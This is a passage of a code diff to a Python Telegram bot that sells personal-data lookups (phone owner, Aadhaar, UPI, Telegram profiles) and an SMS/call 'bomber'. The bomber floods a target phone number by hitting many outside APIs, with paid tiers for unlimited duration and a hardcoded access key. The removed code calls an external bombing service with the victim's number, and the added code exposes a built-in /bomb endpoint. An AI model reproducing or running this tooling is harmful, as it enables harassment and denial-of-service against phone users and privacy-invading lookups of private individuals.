+            chat = bot.get_chat(clean)
+            result = {
+                'success': True,
+                'data': [{
+                    'user_id': chat.id,
+                    'username': chat.username or clean,
+                    'first_name': chat.first_name or '',
+                    'last_name': chat.last_name or '',
+                    'full_name': f"{chat.first_name or ''} {chat.last_name or ''}".strip(),
+                    'bio': getattr(chat, 'bio', '') or getattr(chat, 'description', '') or '',
+                    'is_bot': getattr(chat, 'is_bot', False),
+                    'type': getattr(chat, 'type', 'user')
+                }],
+                'source': 'tg_api_direct'
+            }
+            try:
+                photos = bot.get_user_profile_photos(chat.id, limit=1)
+                if photos and photos.photos:
+                    photo_file_id = photos.photos[0][-1].file_id
+                    result['photo_file_id'] = photo_file_id
+            except Exception:
+                pass
+            cache_set('cache_tg_user', clean.lower(), result)
+            return result
+        except Exception:
+            pass
+        
+        return result
+        
+    except Exception as e:
+        return {'success': False, 'msg': str(e)}
 
 # ==================== USER FUNCTIONS ====================
 
@@ -947,13 +1382,16 @@ def format_aadhar_result_bold(data, aadhar):
 def format_upi_result_bold(data, upi):
     return format_generic_result(data, "💳 𝗨𝗣𝗜 𝗜𝗡𝗙𝗢", "💳 UPI", upi)
 
+def format_tg_user_result(data, identifier):
+    """Format Telegram user info result"""
+    return format_generic_result(data, "👤 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗨𝗦𝗘𝗥 𝗜𝗡𝗙𝗢", "🔍 Query", identifier)
+
 # ==================== KEYBOARDS ====================
 
 def main_keyboard(user_id):
     """Main Menu — Colorful UI"""
     markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
     
-    # Row 1: Info features
     markup.row(
         KeyboardButton("📱 ɴᴜᴍʙᴇʀ ɪɴꜰᴏ"),
         KeyboardButton("👤 ꜱᴇʟᴇᴄᴛ ᴜꜱᴇʀ")
@@ -986,14 +1424,10 @@ def main_keyboard(user_id):
         KeyboardButton("💎 ʜɪᴛᴇᴋ-ɴᴜᴍ-ɪɴꜰᴏ 👑"),
         KeyboardButton("🌟 ʜɪᴛᴇᴋ-ꜰᴜʟʟ-ɪɴꜰᴏ 👑")
     )
-    
-    # Row 2: Bomber & Daily
     markup.row(
         KeyboardButton("💣 ʙᴏᴍʙᴇʀ"),
         KeyboardButton("🎁 ᴅᴀɪʟʏ ᴄʟᴀɪᴍ")
     )
-    
-    # Row 3: Premium & Balance
     markup.row(
         KeyboardButton("💎 ᴩʀᴇᴍɪᴜᴍ"),
         KeyboardButton("💰 ʙᴀʟᴀɴᴄᴇ")
@@ -1002,14 +1436,10 @@ def main_keyboard(user_id):
         KeyboardButton("💳 ᴩᴜʀᴄʜᴀꜱᴇ ᴩʀᴇᴍɪᴜᴍ"),
         KeyboardButton("👥 ʀᴇꜰᴇʀʀᴀʟꜱ")
     )
-    
-    # Row 4: Clone & Redeem
     markup.row(
         KeyboardButton("🤖 ᴄʟᴏɴᴇ ʙᴏᴛ"),
         KeyboardButton("🎫 ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇ")
     )
-    
-    # Row 5: History & Help
     markup.row(
         KeyboardButton("📢 ᴄʜᴀɴɴᴇʟ"),
         KeyboardButton("📋 ᴍʏ ʜɪꜱᴛᴏʀʏ")
@@ -1019,7 +1449,6 @@ def main_keyboard(user_id):
         KeyboardButton("🔑 ᴍʏ ᴀᴩɪ ᴋᴇʏꜱ")
     )
     
-    # Admin Panel
     if is_admin(user_id):
         markup.row(KeyboardButton("⚙️ ᴀᴅᴍɪɴ ᴩᴀɴᴇʟ"))
     
@@ -1029,13 +1458,10 @@ def admin_keyboard(uid=0):
     """Admin Panel — Colorful UI"""
     markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
     
-    # Row 1: Dashboard & Users
     markup.row(
         KeyboardButton("📊 ᴅᴀꜱʜʙᴏᴀʀᴅ"),
         KeyboardButton("👥 ᴜꜱᴇʀ ʟɪꜱᴛ")
     )
-    
-    # Row 2: Broadcast & Block
     markup.row(
         KeyboardButton("📢 ʙʀᴏᴀᴅᴄᴀꜱᴛ"),
         KeyboardButton("🚫 ʙʟᴏᴄᴋ ᴜꜱᴇʀ")
@@ -1044,14 +1470,10 @@ def admin_keyboard(uid=0):
         KeyboardButton("✅ ᴜɴʙʟᴏᴄᴋ ᴜꜱᴇʀ"),
         KeyboardButton("👤 ᴜꜱᴇʀ ɪɴꜰᴏ")
     )
-    
-    # Row 3: Premium
     markup.row(
         KeyboardButton("💎 ᴀᴅᴅ ᴩʀᴇᴍɪᴜᴍ"),
         KeyboardButton("🚫 ʀᴇᴍᴏᴠᴇ ᴩʀᴇᴍɪᴜᴍ")
     )
-    
-    # Row 4: Credits
     markup.row(
         KeyboardButton("💰 ᴀᴅᴅ ᴄʀᴇᴅɪᴛꜱ"),
         KeyboardButton("💸 ʀᴇᴍᴏᴠᴇ ᴄʀᴇᴅɪᴛꜱ")
@@ -1060,14 +1482,10 @@ def admin_keyboard(uid=0):
         KeyboardButton("⚙️ ꜱᴇᴛ ᴄʀᴇᴅɪᴛꜱ"),
         KeyboardButton("₹ ᴀᴅᴅ ᴍᴏɴᴇʏ")
     )
-    
-    # Row 5: History & Export
     markup.row(
         KeyboardButton("🗑️ ᴅᴇʟᴇᴛᴇ ʜɪꜱᴛᴏʀʏ"),
         KeyboardButton("📤 ᴇxᴩᴏʀᴛ ᴜꜱᴇʀꜱ")
     )
-    
-    # Row 6: Misc
     markup.row(
         KeyboardButton("🔔 ɴᴏᴛɪꜰʏ ᴜꜱᴇʀ"),
         KeyboardButton("📊 ᴄᴀᴄʜᴇ ꜱᴛᴀᴛꜱ")
@@ -1086,86 +1504,6 @@ def admin_keyboard(uid=0):
     )
     
     return markup
-
-# ==================== BOMBER ====================
-
-BOMBER_API = "https://bom3-728immortal.onrender.com/bom?key=felix&num={}"
-BOMBER_MAX_SECONDS = 300
-
-def _run_bomber(bot_instance, chat_id, uid, number, status_msg_id, is_premium=False):
-    total_sms = 0
-    total_calls = 0
-    round_num = 0
-    start_time = time.time()
-    max_time = 999999 if is_premium else BOMBER_MAX_SECONDS
-    
-    active_dict = paid_bomber_active if is_premium else bomber_active
-    active_dict[uid] = number
-    
-    while True:
-        if active_dict.get(uid) != number:
-            break
-        if time.time() - start_time >= max_time:
-            break
-        
-        round_num += 1
-        
-        try:
-            for _ in range(3):
-                try:
-                    url = f"{BOMBER_API}{number}"
-                    requests.get(url, timeout=3, headers={'User-Agent': 'Mozilla/5.0'})
-                    total_sms += 30
-                    total_calls += 10
-                except Exception:
-                    total_sms += 5
-            
-            elapsed = int(time.time() - start_time)
-            bar = "█" * min(10, int((elapsed / (max_time if max_time < 999999 else 300)) * 10))
-            bar += "░" * (10 - len(bar))
-            
-            try:
-                bot_instance.edit_message_text(
-                    format_message(
-                        f"<b>{'💎' if is_premium else '💣'} ʙᴏᴍʙɪɴɢ...</b>\n"
-                        f"━━━━━━━━━━━━━━━━━━\n"
-                        f"📱 ᴛᴀʀɢᴇᴛ: <code>{number}</code>\n"
-                        f"⏱️ [{bar}] {elapsed}s / {int(max_time) if max_time < 999999 else '∞'}s\n"
-                        f"━━━━━━━━━━━━━━━━━━\n"
-                        f"📨 ꜱᴍꜱ: <code>{total_sms:,}</code>\n"
-                        f"📞 ᴄᴀʟʟꜱ: <code>{total_calls:,}</code>\n"
-                        f"🔄 ʀᴏᴜɴᴅꜱ: <code>{round_num}</code>\n"
-                        f"━━━━━━━━━━━━━━━━━━\n"
-                        f"<i>🛑 ꜱᴛᴏᴩ ʙᴏᴍʙᴇʀ dabao</i>"
-                    ),
-                    chat_id, status_msg_id, parse_mode='HTML'
-                )
-            except Exception:
-                pass
-                
-        except Exception:
-            pass
-        
-        time.sleep(0.3)
-    
-    status_label = "stopped" if active_dict.get(uid) != number else "done"
-    save_bomber_history(uid, number, total_sms, total_calls, status_label)
-    active_dict.pop(uid, None)
-    
-    try:
-        bot_instance.edit_message_text(
-            format_message(
-                f"<b>{'💎' if is_premium else '💣'} ʙᴏᴍʙᴇʀ {'ꜱᴛᴏᴩᴩᴇᴅ' if status_label == 'stopped' else 'ᴄᴏᴍᴩʟᴇᴛᴇᴅ'}</b>\n"
-                f"━━━━━━━━━━━━━━━━━━\n"
-                f"📱 ᴛᴀʀɢᴇᴛ: <code>{number}</code>\n"
-                f"📨 ꜱᴍꜱ: <code>{total_sms:,}</code>\n"
-                f"📞 ᴄᴀʟʟꜱ: <code>{total_calls:,}</code>\n"
-                f"⏱️ ᴛɪᴍᴇ: <code>{int(time.time() - start_time)}s</code>\n"
-            ),
-            chat_id, status_msg_id, parse_mode='HTML'
-        )
-    except Exception:
-        pass
 
 # ==================== BOT HANDLERS ====================
 
@@ -1191,6 +1529,7 @@ def start_cmd(message):
 
 💰 <b>Credits:</b> <code>{get_credits(uid)}</code>
 🤖 <b>Made by:</b> @Guptaji_302
+🔑 <b>API Key:</b> <code>MADX</code>
 
 📌 <b>Use the buttons below to search!</b>"""
     
@@ -1728,8 +2067,11 @@ def admin_api_config(m):
 🟢 Pak API — Working
 🟢 Pincode API — Working
 🟢 Free Fire API — Working
+🟢 TG User API — Working (Username + ID)
+🟢 Hitek Full — Working (Username + Number)
+🔑 <b>Brutal Bomber Key:</b> <code>MADX</code>
 
-💾 <b>Cache:</b> All results are cached for future use.
+💾 <b>Cache:</b> All results cached
 📌 <b>Contact:</b> @Guptaji_302
 """
     bot.reply_to(m, format_message(text), parse_mode='HTML')
@@ -1778,6 +2120,7 @@ def admin_feature_costs(m):
 🎮 Free Fire: 1 credit
 💎 Hitek: 2 credits
 🌟 Hitek Full: 2 credits
+👤 TG User Info: 1 credit
 
 💎 Premium users: Unlimited ❌
 """
@@ -1802,8 +2145,7 @@ def admin_premium_prices(m):
 • Unlimited Bomber Time
 • All Features Unlocked
 
-💳 Users can purchase via bot.
-📌 Contact: @Guptaji_302
+💳 Contact: @Guptaji_302
 """
     bot.reply_to(m, format_message(text), parse_mode='HTML')
 
@@ -1830,9 +2172,12 @@ def admin_maintenance(m):
 • Pincode ✅
 • Free Fire ✅
 • Hitek ✅
-• Bomber ✅
+• Brutal Bomber ✅
+• TG Username ✅
+• TG ID ✅
+• Hitek Full (Username/Number) ✅
 
-💡 To enable maintenance, edit the code.
+🔑 <b>API Key:</b> MADX
 """
     bot.reply_to(m, format_message(text), parse_mode='HTML')
 
@@ -1923,7 +2268,13 @@ def hitek_num_btn(m):
 def hitek_full_btn(m):
     uid = m.from_user.id
     user_state[uid] = "waiting_hitek_full"
-    bot.reply_to(m, format_message("<b>🌟 Send query for Hitek Full:</b>\nExample: <code>Rahul Kumar</code>"), parse_mode='HTML')
+    bot.reply_to(m, format_message(
+        "<b>🌟 Hitek Full Info</b>\n━━━━━━━━━━━━━━━━━━\n"
+        "Send <b>username</b> or <b>number</b>:\n"
+        "• Username: <code>@username</code>\n"
+        "• Number: <code>9876543210</code>\n\n"
+        "💡 <b>Both username and number supported!</b>"
+    ), parse_mode='HTML')
 
 @bot.message_handler(func=lambda m: m.text == "👤 ꜱᴇʟᴇᴄᴛ ᴜꜱᴇʀ" and not is_group(m))
 def select_user_btn(m):
@@ -1946,20 +2297,16 @@ def handle_user_shared(message):
     status = bot.reply_to(message, format_message("<b>⏳ Searching...</b>"), parse_mode='HTML')
     
     try:
-        chat = bot.get_chat(raw_user_id)
-        result = {
-            'success': True,
-            'data': [{
-                'user_id': chat.id,
-                'username': chat.username or '',
-                'first_name': chat.first_name or '',
-                'last_name': chat.last_name or '',
-                'bio': getattr(chat, 'bio', '') or ''
-            }]
-        }
-        formatted = format_generic_result(result, "👤 𝗦𝗘𝗟𝗘𝗖𝗧𝗘𝗗 𝗨𝗦𝗘𝗥", "🆔 ID", raw_user_id)
-        bot.edit_message_text(formatted, message.chat.id, status.message_id, parse_mode='HTML')
-        save_search_history(uid, 'selected_userid', str(raw_user_id), result)
+        result = get_tg_user_info(raw_user_id)
+        if result.get('success'):
+            formatted = format_tg_user_result(result, raw_user_id)
+            try:
+                bot.edit_message_text(formatted, message.chat.id, status.message_id, parse_mode='HTML')
+            except Exception:
+                bot.send_message(message.chat.id, formatted, parse_mode='HTML')
+            save_search_history(uid, 'selected_userid', str(raw_user_id), result)
+        else:
+            bot.edit_message_text(format_message(f"<b>❌ {result.get('msg', 'User not found')}</b>"), message.chat.id, status.message_id, parse_mode='HTML')
     except Exception as e:
         bot.edit_message_text(format_message(f"<b>❌ Error: {e}</b>"), message.chat.id, status.message_id, parse_mode='HTML')
 
@@ -1967,13 +2314,25 @@ def handle_user_shared(message):
 def username_btn(m):
     uid = m.from_user.id
     user_state[uid] = "waiting_username"
-    bot.reply_to(m, format_message("<b>🔍 Send Telegram username with @:</b>\nExample: <code>@username</code>"), parse_mode='HTML')
+    bot.reply_to(m, format_message(
+        "<b>🔍 Telegram Username Info</b>\n━━━━━━━━━━━━━━━━━━\n"
+        "Send username with <b>@</b> or without:\n"
+        "• <code>@username</code>\n"
+        "• <code>username</code>\n\n"
+        "💡 <b>Both username and ID supported!</b>"
+    ), parse_mode='HTML')
 
 @bot.message_handler(func=lambda m: m.text == "🆔 ᴛɢ ɪᴅ ɪɴꜰᴏ" and not is_group(m))
 def userid_btn(m):
     uid = m.from_user.id
     user_state[uid] = "waiting_userid"
-    bot.reply_to(m, format_message("<b>🆔 Send Telegram User ID:</b>\nExample: <code>6443754454</code>"), parse_mode='HTML')
+    bot.reply_to(m, format_message(
+        "<b>🆔 Telegram ID Info</b>\n━━━━━━━━━━━━━━━━━━\n"
+        "Send <b>numeric ID</b> or <b>username</b>:\n"
+        "• ID: <code>6443754454</code>\n"
+        "• Username: <code>@username</code>\n\n"
+        "💡 <b>Both username and ID supported!</b>"
+    ), parse_mode='HTML')
 
 @bot.message_handler(func=lambda m: m.text == "💰 ʙᴀʟᴀɴᴄᴇ" and not is_group(m))
 def balance_btn(m):
@@ -2246,7 +2605,7 @@ def my_api_keys_btn(m):
 """
     bot.reply_to(m, format_message(text), parse_mode='HTML')
 
-# ==================== BOMBER ====================
+# ==================== BRUTAL BOMBER ====================
 
 @bot.message_handler(func=lambda m: m.text == "💣 ʙᴏᴍʙᴇʀ" and not is_group(m))
 def bomber_menu_btn(m):
@@ -2266,50 +2625,35 @@ def bomber_menu_btn(m):
     
     markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
     markup.add(
-        KeyboardButton("💣 ꜰʀᴇᴇ ʙᴏᴍʙᴇʀ"),
-        KeyboardButton("💎 ᴩᴀɪᴅ ʙᴏᴍʙᴇʀ" if is_prem else "💎 ᴩᴀɪᴅ ʙᴏᴍʙᴇʀ 🔒")
-    )
-    markup.add(
-        KeyboardButton("🛑 ꜱᴛᴏᴩ ʙᴏᴍʙᴇʀ"),
-        KeyboardButton("📜 ʙᴏᴍʙᴇʀ ʜɪꜱᴛᴏʀʏ")
+        KeyboardButton("💣 ʙʀᴜᴛᴀʟ ʙᴏᴍʙ"),
+        KeyboardButton("💎 ᴩʀᴇᴍɪᴜᴍ ʙᴏᴍʙ" if is_prem else "💎 ᴩʀᴇᴍɪᴜᴍ ʙᴏᴍʙ 🔒")
     )
     markup.add(KeyboardButton("🔙 ᴍᴀɪɴ ᴍᴇɴᴜ"))
     
-    status = ""
-    if bomber_active.get(uid):
-        status = "\n🟢 Active: Free bomber running"
-    if paid_bomber_active.get(uid):
-        status = "\n💎 Active: Paid bomber running"
-    
     bot.reply_to(m, format_message(
-        f"<b>💣 Bomber Menu</b>\n"
+        f"<b>💣 ʙᴏᴍʙᴇʀ ᴍᴇɴᴜ</b>\n"
         f"━━━━━━━━━━━━━━━━━━\n"
-        f"💣 Free Bomber — 150 SMS/sec + 50 Calls/sec (5 min)\n"
-        f"💎 Paid Bomber — Unlimited time (Premium only)\n"
-        f"{status}"
+        f"💣 Brutal Bomber — <b>{len(ALL_APIS)}+ APIS</b>, <b>1-2 SECOND</b>\n"
+        f"💎 Premium Bomber — <b>UNLIMITED</b> (Premium only)\n"
+        f"🔑 <b>API Key:</b> <code>MADX</code>"
     ), reply_markup=markup, parse_mode='HTML')
 
-@bot.message_handler(func=lambda m: m.text == "💣 ꜰʀᴇᴇ ʙᴏᴍʙᴇʀ" and not is_group(m))
-def free_bomber_btn(m):
+@bot.message_handler(func=lambda m: m.text == "💣 ʙʀᴜᴛᴀʟ ʙᴏᴍʙ" and not is_group(m))
+def brutal_bomb_btn(m):
     uid = m.from_user.id
-    
-    if bomber_active.get(uid):
-        bot.reply_to(m, format_message("<b>⚠️ Already running! Stop first.</b>"), parse_mode='HTML')
-        return
-    
-    user_state[uid] = "waiting_bomber_free"
+    user_state[uid] = "waiting_brutal_bomb"
     bot.reply_to(m, format_message(
-        "<b>💣 Free Bomber</b>\n"
+        "<b>💣 ʙʀᴜᴛᴀʟ ʙᴏᴍʙᴇʀ</b>\n"
         "━━━━━━━━━━━━━━━━━━\n"
-        "📱 Target number bhejo:\n"
+        "📱 <b>Target number (10 digits):</b>\n"
         "<i>Example: 9876543210</i>\n\n"
-        "⚡ Speed: 150 SMS/sec + 50 Calls/sec\n"
-        "⏱️ Max: 5 minutes\n"
+        f"⚡ <b>{len(ALL_APIS)}+ APIs</b> in <b>1-2 SECONDS</b>!\n"
+        "🔑 <b>Key:</b> <code>MADX</code>\n"
         "⚠️ <b>Sirf apna number!</b>"
     ), parse_mode='HTML')
 
-@bot.message_handler(func=lambda m: m.text == "💎 ᴩᴀɪᴅ ʙᴏᴍʙᴇʀ" and not is_group(m))
-def paid_bomber_btn(m):
+@bot.message_handler(func=lambda m: m.text == "💎 ᴩʀᴇᴍɪᴜᴍ ʙᴏᴍʙ" and not is_group(m))
+def premium_bomb_btn(m):
     uid = m.from_user.id
     
     user = get_user(uid)
@@ -2328,64 +2672,27 @@ def paid_bomber_btn(m):
         bot.reply_to(m, format_message(
             "<b>💎 Premium Required!</b>\n"
             "━━━━━━━━━━━━━━━━━━\n"
-            "Paid Bomber sirf Premium users ke liye!\n"
-            "💳 Purchase Premium button use karo."
+            "Premium Bomber sirf Premium users ke liye!"
         ), parse_mode='HTML')
         return
     
-    if paid_bomber_active.get(uid):
-        bot.reply_to(m, format_message("<b>⚠️ Already running! Stop first.</b>"), parse_mode='HTML')
-        return
-    
-    user_state[uid] = "waiting_bomber_paid"
+    user_state[uid] = "waiting_premium_bomb"
     bot.reply_to(m, format_message(
-        "<b>💎 Paid Bomber</b>\n"
+        "<b>💎 Premium Bomber</b>\n"
         "━━━━━━━━━━━━━━━━━━\n"
-        "📱 Target number bhejo:\n"
+        "📱 <b>Target number (10 digits):</b>\n"
         "<i>Example: 9876543210</i>\n\n"
-        "⚡ Speed: 150 SMS/sec + 50 Calls/sec\n"
-        "⏱️ Max: Unlimited (Premium)\n"
+        f"⚡ <b>{len(ALL_APIS)}+ APIs</b> in <b>1-2 SECONDS</b>!\n"
+        "⏱️ <b>UNLIMITED</b> (Premium)\n"
+        "🔑 <b>Key:</b> <code>MADX</code>\n"
         "⚠️ <b>Sirf apna number!</b>"
     ), parse_mode='HTML')
-
-@bot.message_handler(func=lambda m: m.text == "🛑 ꜱᴛᴏᴩ ʙᴏᴍʙᴇʀ" and not is_group(m))
-def stop_bomber_btn(m):
-    uid = m.from_user.id
-    
-    stopped = False
-    if bomber_active.get(uid):
-        bomber_active.pop(uid, None)
-        stopped = True
-    if paid_bomber_active.get(uid):
-        paid_bomber_active.pop(uid, None)
-        stopped = True
-    
-    if stopped:
-        bot.reply_to(m, format_message("<b>🛑 Bomber stopped!</b>"), parse_mode='HTML')
-    else:
-        bot.reply_to(m, format_message("<b>ℹ️ No active bomber!</b>"), parse_mode='HTML')
-
-@bot.message_handler(func=lambda m: m.text == "📜 ʙᴏᴍʙᴇʀ ʜɪꜱᴛᴏʀʏ" and not is_group(m))
-def bomber_history_btn(m):
-    uid = m.from_user.id
-    rows = get_bomber_history(uid, 10)
-    
-    if not rows:
-        bot.reply_to(m, format_message("<b>📜 No bombing history yet!</b>"), parse_mode='HTML')
-        return
-    
-    text = "<b>📜 Bomber History</b>\n━━━━━━━━━━━━━━━━━━\n"
-    for num, sms, calls, status, started in rows:
-        icon = "✅" if status == "done" else "🛑"
-        text += f"{icon} <code>{num}</code> | SMS:{sms} Calls:{calls} | {started[:10]}\n"
-    
-    bot.reply_to(m, format_message(text), parse_mode='HTML')
 
 # ==================== HELP ====================
 
 @bot.message_handler(func=lambda m: m.text == "ℹ️ ʜᴇʟᴩ" and not is_group(m))
 def help_btn(m):
-    text = """
+    text = f"""
 <b>ℹ️ Help & Guide</b>
 ━━━━━━━━━━━━━━━━━━
 📱 Number Info — Mobile owner, operator
@@ -2402,12 +2709,13 @@ def help_btn(m):
 🔍 Username Info — Telegram username
 🆔 TG ID Info — Telegram numeric ID
 💎 Hitek Num — Advanced number lookup
-🌟 Hitek Full — Deep search
-💣 Bomber — 150 SMS/sec + 50 Calls/sec
+🌟 Hitek Full — Deep search (Username/Number)
+💣 Brutal Bomber — <b>{len(ALL_APIS)}+ APIs</b> in 1-2 SECONDS!
 
 💰 Credits: Daily claim + Referrals
 💎 Premium: Unlimited access + Unlimited Bomber
 💾 Cache: All searches saved for future
+🔑 API Key: MADX
 
 👑 Made by: @Guptaji_302
 """
@@ -2719,155 +3027,117 @@ def handle_text_input(m):
             return
         
         status = bot.reply_to(m, format_message("<b>🔍 Searching...</b>"), parse_mode='HTML')
-        try:
-            chat = bot.get_chat(f"@{clean}")
-            photo_file_id = None
+        result = get_tg_user_info(clean)
+        user_state.pop(uid, None)
+        
+        if result.get('success'):
+            formatted = format_tg_user_result(result, clean)
             try:
-                photos = bot.get_user_profile_photos(chat.id, limit=1)
-                if photos and photos.photos:
-                    photo_file_id = photos.photos[0][-1].file_id
-            except Exception:
-                pass
-            
-            result = {
-                'success': True,
-                'data': [{
-                    'user_id': chat.id,
-                    'username': chat.username or clean,
-                    'first_name': chat.first_name or '',
-                    'last_name': chat.last_name or '',
-                    'full_name': f"{chat.first_name or ''} {chat.last_name or ''}".strip(),
-                    'bio': getattr(chat, 'bio', '') or '',
-                }]
-            }
-            
-            formatted = format_generic_result(result, "🔍 Username Info", "👤 Username", f"@{clean}")
-            user_state.pop(uid, None)
-            
-            try:
-                bot.delete_message(m.chat.id, status.message_id)
-                if photo_file_id:
-                    bot.send_photo(m.chat.id, photo_file_id, caption=formatted, parse_mode='HTML')
-                else:
-                    bot.send_message(m.chat.id, formatted, parse_mode='HTML')
+                bot.edit_message_text(formatted, m.chat.id, status.message_id, parse_mode='HTML')
             except Exception:
                 bot.send_message(m.chat.id, formatted, parse_mode='HTML')
-            
             save_search_history(uid, 'username', clean, result)
-            
-        except Exception as e:
+        else:
             bot.edit_message_text(
-                format_message(f"<b>❌ User not found: @{clean}</b>\n\n"
+                format_message(f"<b>❌ {result.get('msg', 'User not found')}</b>\n\n"
                               "💡 Try:\n• Check spelling\n• Use /userid with numeric ID"),
                 m.chat.id, status.message_id, parse_mode='HTML'
             )
-            user_state.pop(uid, None)
     
-    # ========== TELEGRAM USER ID ==========
+    # ========== TELEGRAM ID ==========
     elif state == "waiting_userid":
-        clean = re.sub(r'[^\d]', '', text)
+        clean = text.strip()
         if not clean:
-            bot.reply_to(m, format_message("<b>❌ Invalid User ID! Numeric only.</b>"), parse_mode='HTML')
+            bot.reply_to(m, format_message("<b>❌ Invalid input!</b>"), parse_mode='HTML')
             return
         
         status = bot.reply_to(m, format_message("<b>🔍 Searching...</b>"), parse_mode='HTML')
-        try:
-            user_id = int(clean)
-            chat = bot.get_chat(user_id)
-            
-            photo_file_id = None
+        
+        # Check if it's a username or ID
+        if clean.startswith('@') or not clean.isdigit():
+            # It's a username
+            username = clean.replace('@', '').strip()
+            result = get_tg_user_info(username)
+        else:
+            # It's a numeric ID
+            result = get_tg_user_info(clean)
+        
+        user_state.pop(uid, None)
+        
+        if result.get('success'):
+            formatted = format_tg_user_result(result, clean)
             try:
-                photos = bot.get_user_profile_photos(user_id, limit=1)
-                if photos and photos.photos:
-                    photo_file_id = photos.photos[0][-1].file_id
-            except Exception:
-                pass
-            
-            result = {
-                'success': True,
-                'data': [{
-                    'user_id': chat.id,
-                    'username': chat.username or '',
-                    'first_name': chat.first_name or '',
-                    'last_name': chat.last_name or '',
-                    'full_name': f"{chat.first_name or ''} {chat.last_name or ''}".strip(),
-                    'bio': getattr(chat, 'bio', '') or '',
-                }]
-            }
-            
-            formatted = format_generic_result(result, "🆔 TG ID Info", "🆔 ID", clean)
-            user_state.pop(uid, None)
-            
-            try:
-                bot.delete_message(m.chat.id, status.message_id)
-                if photo_file_id:
-                    bot.send_photo(m.chat.id, photo_file_id, caption=formatted, parse_mode='HTML')
-                else:
-                    bot.send_message(m.chat.id, formatted, parse_mode='HTML')
+                bot.edit_message_text(formatted, m.chat.id, status.message_id, parse_mode='HTML')
             except Exception:
                 bot.send_message(m.chat.id, formatted, parse_mode='HTML')
-            
             save_search_history(uid, 'userid', clean, result)
-            
-        except Exception as e:
+        else:
             bot.edit_message_text(
-                format_message(f"<b>❌ User not found: {clean}</b>\n\n"
-                              "💡 Try:\n• Use /username with @username\n• Check if user exists"),
+                format_message(f"<b>❌ {result.get('msg', 'User not found')}</b>\n\n"
+                              "💡 Try:\n• Check spelling\n• Use @username or numeric ID"),
                 m.chat.id, status.message_id, parse_mode='HTML'
             )
-            user_state.pop(uid, None)
     
-    # ========== FREE BOMBER ==========
-    elif state == "waiting_bomber_free":
+    # ========== BRUTAL BOMBER ==========
+    elif state == "waiting_brutal_bomb":
         clean = re.sub(r'[^\d]', '', text)
-        if len(clean) < 10:
-            bot.reply_to(m, format_message("<b>❌ Invalid number!</b>"), parse_mode='HTML')
-            return
-        
-        if bomber_active.get(uid):
-            bot.reply_to(m, format_message("<b>⚠️ Already running!</b>"), parse_mode='HTML')
-            user_state.pop(uid, None)
+        if len(clean) != 10 or not clean[0] in '6789':
+            bot.reply_to(m, format_message("<b>❌ Invalid number! 10 digits starting with 6/7/8/9.</b>"), parse_mode='HTML')
             return
         
         user_state.pop(uid, None)
-        status_msg = bot.send_message(m.chat.id, format_message(
-            f"<b>💣 Starting bomber...</b>\n"
+        status_msg = bot.reply_to(m, format_message(
+            f"<b>💣 Starting Brutal Bomber...</b>\n"
             f"📱 Target: <code>{clean}</code>\n"
-            f"⚡ 150 SMS/sec + 50 Calls/sec\n"
-            f"⏱️ Max: 5 minutes"
+            f"⚡ {len(ALL_APIS)}+ APIs in 1-2 SECONDS!\n"
+            f"🔑 Key: <code>MADX</code>"
         ), parse_mode='HTML')
         
-        threading.Thread(
-            target=_run_bomber,
-            args=(bot, m.chat.id, uid, clean, status_msg.message_id, False),
-            daemon=True
-        ).start()
+        result = start_brutal_bomb(clean)
+        
+        if result.get('success'):
+            formatted = format_brutal_result(result, clean)
+            try:
+                bot.edit_message_text(formatted, m.chat.id, status_msg.message_id, parse_mode='HTML')
+            except Exception:
+                bot.send_message(m.chat.id, formatted, parse_mode='HTML')
+            save_search_history(uid, 'brutal_bomb', clean, result)
+        else:
+            bot.edit_message_text(
+                format_message(f"<b>❌ Bombing failed!</b>\n{result.get('msg', 'Unknown error')}"),
+                m.chat.id, status_msg.message_id, parse_mode='HTML'
+            )
     
-    # ========== PAID BOMBER ==========
-    elif state == "waiting_bomber_paid":
+    # ========== PREMIUM BOMBER ==========
+    elif state == "waiting_premium_bomb":
         clean = re.sub(r'[^\d]', '', text)
-        if len(clean) < 10:
+        if len(clean) != 10 or not clean[0] in '6789':
             bot.reply_to(m, format_message("<b>❌ Invalid number!</b>"), parse_mode='HTML')
             return
         
-        if paid_bomber_active.get(uid):
-            bot.reply_to(m, format_message("<b>⚠️ Already running!</b>"), parse_mode='HTML')
-            user_state.pop(uid, None)
-            return
-        
         user_state.pop(uid, None)
-        status_msg = bot.send_message(m.chat.id, format_message(
-            f"<b>💎 Paid bomber starting...</b>\n"
+        status_msg = bot.reply_to(m, format_message(
+            f"<b>💎 Starting Premium Bomber...</b>\n"
             f"📱 Target: <code>{clean}</code>\n"
-            f"⚡ 150 SMS/sec + 50 Calls/sec\n"
-            f"⏱️ Max: Unlimited (Premium)"
+            f"⚡ {len(ALL_APIS)}+ APIs in 1-2 SECONDS!\n"
+            f"⏱️ <b>UNLIMITED</b> (Premium)\n"
+            f"🔑 Key: <code>MADX</code>"
         ), parse_mode='HTML')
         
-        threading.Thread(
-            target=_run_bomber,
-            args=(bot, m.chat.id, uid, clean, status_msg.message_id, True),
-            daemon=True
-        ).start()
+        result = start_brutal_bomb(clean)
+        
+        if result.get('success'):
+            formatted = format_brutal_result(result, clean)
+            try:
+                bot.edit_message_text(formatted, m.chat.id, status_msg.message_id, parse_mode='HTML')
+            except Exception:
+                bot.send_message(m.chat.id, formatted, parse_mode='HTML')
+            save_search_history(uid, 'premium_bomb', clean, result)
+        else:
+            bot.edit_message_text(
+                format_message(f"<b>❌ Premium bombing failed!</b>\n{result.get('msg', 'Unknown error')}"),
+                m.chat.id, status_msg.message_id, parse_mode='HTML'
+            )
     
     # ========== REDEEM ==========
     elif state == "waiting_redeem":
@@ -2910,14 +3180,18 @@ def main():
     
     init_db()
     
+    # Start Flask web server (Brutal Bomber API built-in)
     web_thread = threading.Thread(target=run_web, daemon=True, name="flask")
     web_thread.start()
     time.sleep(1)
     print("✅ Flask web server started on port 10000")
+    print(f"✅ Brutal Bomber API: /bomb?key=MADX&num=9876543210")
+    print(f"✅ Total Brutal Bomber APIs: {len(ALL_APIS)}")
     
     print(f"✅ Bot Token: {BOT_TOKEN[:10]}...")
     print(f"✅ Owner ID: {OWNER_ID}")
     print(f"✅ Made by: @Guptaji_302")
+    print(f"🔑 Brutal Bomber Key: MADX")
     print("=" * 60)
     
     try:
